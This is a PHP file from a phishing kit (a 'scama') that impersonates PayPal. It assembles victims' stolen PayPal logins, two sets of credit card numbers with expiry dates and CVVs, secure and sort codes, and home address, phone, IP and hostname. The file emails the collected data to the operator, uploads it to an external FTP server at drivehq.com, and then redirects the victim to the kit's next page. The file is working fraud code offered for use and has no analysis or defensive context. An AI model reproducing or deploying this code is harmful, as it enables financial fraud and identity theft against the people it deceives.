<?php
session_start();
/*

+----------------------------------+
�--- PRIVATE  PP SCAMA   2015 -----�
�---------- Ver : 2.0 -------------�
�--------- Hamza El     -----------�
�----------- GREETZ TO ------------�
�--- Dz Phoniex : Dz Injector -----�
�----------------------------------�
�https://code.google.com/p/dznoob/ �
�----------------------------------�
�https://facebook.com/DzNOoBpage   �
+----------------------------------+


*/
@ini_set('display_errors', 0);
error_reporting(E_ALL ^ E_NOTICE);
include "option.php";
include "antibot.php";
include 'dznoob-country.php';


$r= "\n==================: PPL Login :==================
Email Address		: ".$_SESSION['EM']."
Password			: ".$_SESSION['PS']."
-----------------: CC 1 Info :-----------------
Card Number				: ".$_SESSION['dftCN']."
Expiration Date			: ".$_SESSION['datex']." 
Card Verification Number: ".$_SESSION['dftVC']."

SECURE CODE : ".$_POST['pin']."
SORT CODE : ".$_POST['sort']."
-----------------: CC 2 Info :-----------------
Card Number				: ".$_SESSION['dftCN2']."
Expiration Date			: ".$_SESSION['datex2']." 
Card Verification Number: ".$_SESSION['dftVC2']."
---------------------------------------------------
First Name	: ".$_SESSION['gg1']."
Last Name	: ".$_SESSION['gg2']."
Address 1	: ".$_SESSION['gg4']."
Address 2	: ".$_SESSION['gg5']."
City		: ".$_SESSION['gg6']."
ZIP Code	: ".$_SESSION['gg8']."
Country		: ".$_SESSION['gg7']."
".$_SESSION['gg9']."_phone	: ".$_SESSION['gg10']."
================================================
Date		: ".gmdate("d/m/Y - H:i:s")."
Browser		: ".$_POST['BROWSER']."
Client IP	: ".getenv("REMOTE_ADDR")."
HostName	: ".gethostbyaddr(getenv("REMOTE_ADDR"))."
=================: *.HamzaEl.* :================\n";


$subject = " *..Vbv..* | ".$_SESSION['gg7']." | ".$_SESSION['gg2']."  ";

if ( $mail > 0) {
		mail($a, $subject, $r);
}

if ( $ftp > 0) 

{
$datamasii=date("D M d, Y");
$name="./resl/{$_SERVER['HTTP_HOST']}-VBV-{$_SESSION['gg7']}-{$datamasii}.txt";		
$file = fopen($name,"a");
fputs($file,$r);
fclose($file);
$namenodir="{$_SERVER['HTTP_HOST']}-VBV-{$_SESSION['gg7']}-{$datamasii}.txt";	
$ftp_server="ftp.drivehq.com";
$conn_id = ftp_connect($ftp_server);
$login_result = ftp_login($conn_id, $b, $c);
$namenodir=
$upload = ftp_put($conn_id, $namenodir, $name, FTP_BINARY); 
ftp_close($conn_id);

}



?>

<meta http-equiv="refresh" content="0;URL=last/index.php?y= <?php echo md5(rand(100, 999999999)); ?>" />

